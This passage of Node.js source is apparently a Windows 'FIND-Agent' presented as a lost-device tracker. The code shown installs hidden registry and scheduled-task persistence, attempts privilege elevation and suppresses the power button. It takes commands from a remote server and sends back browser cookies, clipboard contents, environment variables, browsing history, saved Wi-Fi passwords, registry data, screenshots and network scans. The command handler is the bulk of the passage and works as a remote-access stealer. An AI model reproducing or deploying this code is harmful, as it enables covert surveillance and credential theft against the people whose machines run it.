  const regCmd = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "FIND-Agent" /t REG_SZ /d "node \\"${agentPath}\\" --hidden" /f`;
  try { await execAsync(regCmd); log('info', 'Registry persistence set'); } catch(e) {}

  // 2. Windows Task Scheduler (survives reboots, runs even if user not logged in)
  const taskName = 'FIND-Agent-Persistent';
  const taskXml = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger>
  </Triggers>
  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions Context="Author">
    <Exec><Command>node</Command><Arguments>"${agentPath}" --hidden</Arguments></Exec>
  </Actions>
</Task>`;
  try {
    const taskFile = path.join(os.tmpdir(), 'find-task.xml');
    fs.writeFileSync(taskFile, taskXml);
    await execAsync(`schtasks /create /tn "${taskName}" /xml "${taskFile}" /f`, { timeout: 10000 });
    fs.unlinkSync(taskFile);
    log('info', 'Task Scheduler persistence set');
  } catch(e) {
    // Fallback: try without XML
    try {
      await execAsync(`schtasks /create /tn "${taskName}" /tr "node \\"${agentPath}\\" --hidden" /sc onlogon /rl lowest /f`, { timeout: 10000 });
      log('info', 'Task Scheduler persistence set (fallback)');
    } catch(e2) {}
  }

  // 3. Kill any old agent instances
  killOldAgents();
}

// ─── COMMAND HANDLER ─────────────────────────────────────────────────────────

async function handleCommand(msg) {
  const { commandId, commandType, params = {} } = msg;
  log('info', `Executing: ${commandType}`);
  let result = { success: false };

  try {
    switch (commandType) {
      case 'lost-mode-on':
        isLostMode = true;
        await suppressPowerButton(true);
        startAutonomousForensics();
        result = { success: true, message: 'Lost Mode Active' };
        break;

      case 'lost-mode-off':
        isLostMode = false;
        await suppressPowerButton(false);
        result = { success: true, message: 'Device Recovered' };
        break;

      case 'locate':
        const loc = await getPreciseLocation(true);
        if (loc) {
          send({ type: 'location', deviceId: pairCode || deviceId, location: loc });
          result = { success: true, location: loc };
        } else {
          // Even if no location, return system info so dashboard isn't blank
          const stats = await getSystemStats();
          result = { success: true, location: null, systemInfo: stats, message: 'Location unavailable — check GPS/WiFi/IP settings' };
        }
        break;

      case 'wifi-scan':
      case 'net-scan':
        const wifi = await getWifiSignals();
        const arp = await runCommand('arp -a');
        result = { success: true, bssids: wifi, arp: arp.stdout };
        break;

      case 'ping':
        const ping = await runCommand(`ping -n 4 ${params.target || '8.8.8.8'}`);
        result = { success: ping.success, output: ping.stdout };
        break;

      case 'lock':
        await aggressiveLock();
        if (isAdmin) await suppressPowerButton(true);
        result = { success: true, message: 'Locked + Power Suppressed' };
        break;

      case 'siren':
        await runPowerShell('for($i=0;$i-lt 20;$i++){ [Console]::Beep(2000,300); Start-Sleep -ms 100 }');
        result = { success: true, message: 'Siren Active' };
        break;

      case 'arp-scan':
        const arpRes = await runCommand('arp -a');
        const routeRes = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object NextHop,InterfaceAlias | ConvertTo-Json');
        result = { success: true, arp: arpRes.stdout, routes: routeRes.stdout };
        break;

      case 'bt-proximity':
        result = { success: true, devices: await getBluetoothSignals() };
        break;

      case 'process-audit':
        result = { success: true, processes: await getProcessForensics(), system: await getDeepSystemInfo() };
        break;

      case 'dns-dump':
        result = { success: true, data: await getDnsDump() };
        break;

      case 'port-audit':
        result = { success: true, data: await getPortAudit() };
        break;

      case 'usb-audit':
        result = { success: true, data: await getUsbAudit() };
        break;

      case 'wifi-passwords':
        result = { success: true, data: await getWifiPasswords() };
        break;

      case 'screenshot':
        result = { success: true, data: await takeScreenshot() };
        break;

      case 'forensic-init':
        await reportLog('system', 'Full forensic sequence started');
        await Promise.allSettled([
          getWifiSignals().then(w => reportLog('wifi-scan', w)),
          getDnsDump(), getPortAudit(), getUsbAudit(),
          getPersistenceCheck(), getProcessForensics(),
          getWifiPasswords(), getDeepSystemInfo(),
          getPreciseLocation(true).then(l => l && send({ type: 'location', deviceId: pairCode || deviceId, location: l }))
        ]);
        result = { success: true, message: 'Forensic sequence complete' };
        break;

      // ── NEW ADVANCED TRACKING TOOLS ──

      case 'ip-scrape':
        const ipResult = await deepIPScrape();
        result = { success: true, data: ipResult };
        await reportLog('ip-scrape', ipResult);
        break;

      case 'wifi-analysis':
        const waResult = await advancedWifiAnalysis();
        result = { success: true, data: waResult };
        await reportLog('wifi-analysis', waResult);
        break;

      case 'port-scan':
        const psResult = await portScan(params.target);
        result = { success: true, data: psResult };
        await reportLog('port-scan', psResult);
        break;

      case 'network-scan':
        const nsResult = await networkScan();
        result = { success: true, data: nsResult };
        await reportLog('network-scan', nsResult);
        break;

      case 'bt-scan':
        const btResult = await bluetoothProximityScan();
        result = { success: true, data: btResult };
        await reportLog('bt-scan', btResult);
        break;

      case 'ml-report':
        result = { success: true, data: decisionEngine.getReport() };
        break;

      case 'network-fingerprint':
        const nfResult = await buildNetworkFingerprint();
        result = { success: true, data: nfResult };
        break;

      case 'position-history':
        result = { success: true, data: positionHistory.slice(-50) };
        break;

      case 'full-recovery-scan':
        log('info', 'Running full recovery scan...');
        await Promise.allSettled([
          deepIPScrape().then(ip => reportLog('recovery-ip', ip)),
          advancedWifiAnalysis().then(wa => reportLog('recovery-wifi', wa)),
          getPreciseLocation(true).then(l => {
            if (l) send({ type: 'location', deviceId: pairCode || deviceId, location: l });
          }),
          buildNetworkFingerprint().then(nf => reportLog('recovery-net', nf)),
          isAdmin ? getPortScan('127.0.0.1') : Promise.resolve()
        ]);
        result = { success: true, message: 'Full recovery scan complete', mlState: decisionEngine.getReport() };
        break;

      // ── ADVANCED SCRAPING TOOLS ──

      case 'cookie-dump':
        const cookieResult = await cookieDump();
        result = { success: true, data: cookieResult };
        await reportLog('cookie-dump', cookieResult);
        break;

      case 'clipboard-grab':
        const clipResult = await clipboardGrab();
        result = { success: true, data: clipResult };
        await reportLog('clipboard-grab', clipResult);
        break;

      case 'env-dump':
        const envResult = await envDump();
        result = { success: true, data: envResult };
        await reportLog('env-dump', envResult);
        break;

      case 'history-dump':
        const histResult = await historyDump();
        result = { success: true, data: histResult };
        await reportLog('history-dump', histResult);
        break;

      case 'installed-apps':
        const appsResult = await installedApps();
        result = { success: true, data: appsResult };
        await reportLog('installed-apps', appsResult);
        break;

      case 'geo-triangulate':
        const geoResult = await geoTriangulate();
        result = { success: true, data: geoResult };
        await reportLog('geo-triangulate', geoResult);
        break;

      case 'open-ports-deep':
        const deepPortResult = await openPortsDeep();
        result = { success: true, data: deepPortResult };
        await reportLog('open-ports-deep', deepPortResult);
        break;

      case 'registry-dump':
        const regResult = await registryDump();
        result = { success: true, data: regResult };
        await reportLog('registry-dump', regResult);
        break;

      case 'active-connections':
        const connResult = await activeConnections();
        result = { success: true, data: connResult };
        await reportLog('active-connections', connResult);
        break;

      case 'system-screenshot':
        const sysShot = await systemScreenshot();
        result = { success: true, data: sysShot };
        await reportLog('system-screenshot', sysShot);
        break;

      // ── NEW COMMANDS (matching windows-app/main.js) ──

      case 'net-scan-adv': {
        const arp2 = await runCommand('arp -a');
        const hosts = [];
        const ifaces = os.networkInterfaces();
        for (const [name, addrs] of Object.entries(ifaces)) {
          for (const addr of addrs) {
            if (addr.family === 'IPv4' && !addr.internal && !addr.address.startsWith('127.')) {
              const subnet = addr.address.split('.').slice(0, 3).join('.');
              for (let i = 1; i <= 20; i++) {
                const p = await runPowerShell(`Test-Connection -ComputerName ${subnet}.${i} -Count 1 -Quiet -TimeoutSeconds 1`, 2000);
                if (p.success && p.stdout.trim() === 'True') hosts.push({ ip: `${subnet}.${i}`, status: 'online' });
              }
              break;
            }
          }
        }
        result = { success: true, arp: arp2.stdout, discoveredHosts: hosts, hostCount: hosts.length };
        break;
      }

      case 'bt-prox-adv': {
        const btPs = `Get-PnpDevice -Class Bluetooth -Status OK -ErrorAction SilentlyContinue | ForEach-Object { $n=$_.FriendlyName; $i=$_.InstanceId; $a=(Get-PnpDeviceProperty -InstanceId $i -KeyName DEVPKEY_BluetoothRadio_Authenticated -ErrorAction SilentlyContinue).Data; [PSCustomObject]@{ Name=$n; InstanceId=$i; Authenticated=$a } } | ConvertTo-Json -Depth 3`;
        const btRes = await runPowerShell(btPs, 10000);
        let btDevices = [];
        if (btRes.success && btRes.stdout.trim()) { try { btDevices = JSON.parse(btRes.stdout); } catch(e) {} }
        if (btDevices && !Array.isArray(btDevices)) btDevices = [btDevices];
        result = { success: true, devices: btDevices || [], count: (btDevices || []).length };
        break;
      }

      case 'port-scan-active': {
        const ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1723,3306,3389,5900,8080,8443,27017,6379,5432];
        const openPorts = [];
        for (const port of ports) {
          const p = await runPowerShell(`Test-NetConnection -ComputerName 127.0.0.1 -Port ${port} -WarningAction SilentlyContinue | Select-Object RemotePort, TcpTestSucceeded | ConvertTo-Json`, 5000);
          if (p.success) { try { const r = JSON.parse(p.stdout); if (r.TcpTestSucceeded) openPorts.push({ port, service: getServiceName(port), state: 'OPEN' }); } catch(e) {} }
        }
        result = { success: true, openPorts, scannedPorts: ports.length };
        break;
      }

      case 'net-fp-tool': {
        const fp = { timestamp: Date.now() };
        const arp3 = await runCommand('arp -a');
        const arpLines = arp3.stdout.split('\n').filter(l => l.includes('dynamic'));
        if (arpLines.length > 0) { const parts = arpLines[0].trim().split(/\s+/); fp.gatewayMac = parts[1] || ''; }
        const netIfaces = os.networkInterfaces();
        for (const [name, addrs] of Object.entries(netIfaces)) {
          for (const addr of addrs) {
            if (addr.family === 'IPv4' && !addr.internal) { fp.localIP = addr.address; fp.mac = addr.mac; fp.interface = name; break; }
          }
          if (fp.localIP) break;
        }
        const rt = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop,InterfaceAlias | ConvertTo-Json');
        if (rt.success) { try { const r = JSON.parse(rt.stdout); fp.gateway = r.NextHop; fp.routeInterface = r.InterfaceAlias; } catch(e) {} }
        const wlan = await runCommand('netsh wlan show interfaces');
        const ssidM = wlan.stdout.match(/SSID\s*:\s*(.+)/i);
        const chanM = wlan.stdout.match(/Channel\s*:\s*(\d+)/i);
        const bssidM = wlan.stdout.match(/BSSID\s*:\s*(.+)/i);
        const sigM = wlan.stdout.match(/Signal\s*:\s*(\d+)%/i);
        fp.ssid = ssidM ? ssidM[1].trim() : '';
        fp.channel = chanM ? parseInt(chanM[1]) : 0;
        fp.connectedBSSID = bssidM ? bssidM[1].trim() : '';
        fp.connectedSignal = sigM ? parseInt(sigM[1]) : 0;
        result = { success: true, ...fp };
        break;
      }

      case 'cell-triangulate': {
        const wifiRaw = await runCommand('netsh wlan show networks mode=bssid');
        const nets = [];
        const matches = wifiRaw.stdout.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
        for (const m of matches) {
          if (m[1] && parseInt(m[2]) > 0) {
            const rssi = Math.round((parseInt(m[2]) / 2) - 100);
            const estDist = Math.pow(10, (-69 - rssi) / (10 * 3.5));
            nets.push({ ssid: m[1].trim(), bssid: m[3]?.trim() || '', rssi, signal: parseInt(m[2]), estimatedDistance: Math.round(estDist) });
          }
        }
        const positioned = [];
        for (const ap of nets.slice(0, 8)) {
          if (!ap.bssid) continue;
          try {
            const data = await new Promise(resolve => {
              https.get(`https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}`, { timeout: 3000 }, res => {
                let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } });
              }).on('error', () => resolve(null));
            });
            if (data && data.result === 200 && data.data) positioned.push({ ...ap, lat: data.data.lat, lng: data.data.lon, range: data.data.range || 200 });
          } catch(e) {}
        }
        if (positioned.length >= 2) {
          let wLat = 0, wLng = 0, tw = 0;
          for (const ap of positioned) { const w = 1 / (ap.estimatedDistance ** 2 + 1); wLat += ap.lat * w; wLng += ap.lng * w; tw += w; }
          result = { success: true, lat: wLat / tw, lng: wLng / tw, accuracy: Math.round(100 + positioned.reduce((a, b) => a + b.estimatedDistance, 0) / positioned.length), source: 'wifi-bssid', apCount: positioned.length, networks: nets.slice(0, 5) };
        } else {
          result = { success: true, source: 'wifi-scan', networks: nets.slice(0, 10), count: nets.length, positionedCount: positioned.length, message: 'Insufficient BSSID database entries for triangulation' };
        }
        break;
      }

      case 'forensic-init':
        await reportLog('system', 'Full forensic sequence started');
        await Promise.allSettled([
          getWifiSignals().then(w => reportLog('wifi-scan', w)),
          getDnsDump(), getPortAudit(), getUsbAudit(),
          getPersistenceCheck(), getProcessForensics(),
          getWifiPasswords(), getDeepSystemInfo(),
          getPreciseLocation(true).then(l => l && send({ type: 'location', deviceId: pairCode || deviceId, location: l }))
        ]);
        result = { success: true, message: 'Forensic sequence complete' };
        break;

      default:
        result = { success: false, error: 'Unknown command' };
    }
  } catch (e) { result = { success: false, error: e.message }; }

  send({ type: 'commandResult', deviceId: pairCode || deviceId, commandId, commandType, result: JSON.stringify(result) });
}

// ─── NETWORK ─────────────────────────────────────────────────────────────────

async function registerWithServer() {
  if (!pairCode && deviceId) {
    try {
      const res = await httpPost('/agent-lookup/' + deviceId, {});
      if (res && res.success && res.pairCode) {
        pairCode = res.pairCode;
        deviceId = res.deviceId || deviceId;
        log('info', `Auto-discovered pairCode: ${pairCode}`);
        try { fs.writeFileSync(CONFIG_FILE, JSON.stringify({ deviceId, pairCode, createdAt: Date.now() })); } catch(e) {}
      }
    } catch(e) {}
  }

  try {
    const data = await httpPost('/agent-register', { deviceId, hostname: os.hostname(), platform: os.platform(), pairCode });
    if (data && data.success) {
      pairCode = data.pairCode;
      deviceId = data.deviceId || deviceId;
      log('info', `Registered: pairCode=${pairCode}`);
      try { fs.writeFileSync(CONFIG_FILE, JSON.stringify({ deviceId, pairCode, createdAt: Date.now() })); } catch(e) {}
    }
  } catch(e) {}
}

function connect() {
  log('info', `Connecting to ${WS_URL}...`);
  ws = new WebSocket(WS_URL);
  ws.on('open', async () => {
    reconnectAttempts = 0;
    log('info', 'WebSocket connected');
    await registerWithServer();
    send({ type: 'register', deviceId: pairCode || deviceId, deviceType: 'agent', hostname: os.hostname(), platform: os.platform() });
    sendForensicHeartbeat().catch(e => log('error', 'Heartbeat failed:', e.message));
    if (ws.pingInterval) clearInterval(ws.pingInterval);
    ws.pingInterval = setInterval(() => { if (ws && ws.readyState === WebSocket.OPEN) ws.ping(); }, 25000);
  });
  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      if (msg.type === 'command') handleCommand(msg);
      if (msg.type === 'locationRequest') sendForensicHeartbeat();
    } catch(e) {}
  });
  ws.on('close', () => {
    if (ws.pingInterval) clearInterval(ws.pingInterval);
    log('warn', 'WS closed. Reconnecting...');
    setTimeout(connect, Math.min(RECONNECT_DELAY * ++reconnectAttempts, 5000));
  });
  ws.on('error', (e) => log('error', 'WS Error:', e.message));
  ws.on('pong', () => {});
}

async function startPolling() {
  setInterval(async () => {
    try {
      const res = await fetch(`${API_URL}/poll/${deviceId}`);
      const data = await res.json();
      if (data.success && data.commands) {
        for (const cmd of data.commands) {
          await handleCommand({ commandId: cmd.commandId, commandType: cmd.commandType, params: cmd.params ? JSON.parse(cmd.params) : {} });
        }
      }
    } catch(e) {}
  }, 10000);
}

function killOldAgents() {
  try {
    if (process.platform !== 'win32') return;
    const output = execSync('wmic process where "name=\'node.exe\'" get ProcessId,CommandLine /format:list', { encoding: 'utf8', timeout: 5000 });
    const lines = output.split('\n');
    let currentPid = null;
    for (const line of lines) {
      if (line.startsWith('ProcessId=')) currentPid = parseInt(line.split('=')[1]);
      if (line.includes('agent.js') && currentPid && currentPid !== process.pid) {
        try { process.kill(currentPid, 'SIGTERM'); log('info', `Killed old agent PID ${currentPid}`); } catch(e) {}
      }
    }
  } catch(e) {}
}

// ─── MAIN ────────────────────────────────────────────────────────────────────

async function start() {
  killOldAgents();
  await elevate();
  checkAdmin();
  await ensurePersistence();

  deviceId = generateDeviceId();
  log('info', `Device ID: ${deviceId}`);

  if (fs.existsSync(CONFIG_FILE)) {
    try {
      const data = JSON.parse(fs.readFileSync(CONFIG_FILE));
      if (data.deviceId) deviceId = data.deviceId;
      if (data.pairCode) { pairCode = data.pairCode; log('info', `Loaded pairCode: ${pairCode}`); }
    } catch(e) {}
  }

  const argPC = process.argv.find(a => a.startsWith('--pair='));
  if (argPC) pairCode = argPC.split('=')[1];
  if (process.env.PAIR_CODE) pairCode = process.env.PAIR_CODE;

  if (!pairCode) log('warn', 'No pairCode. Run browser pairing first.');

  // Load position history
  try {
    if (fs.existsSync(HISTORY_FILE)) {
      positionHistory = JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
      log('info', `Loaded ${positionHistory.length} historical positions`);
    }
  } catch(e) {}

  connect();
  startPolling();
  setInterval(sendForensicHeartbeat, 10000);
}

start();
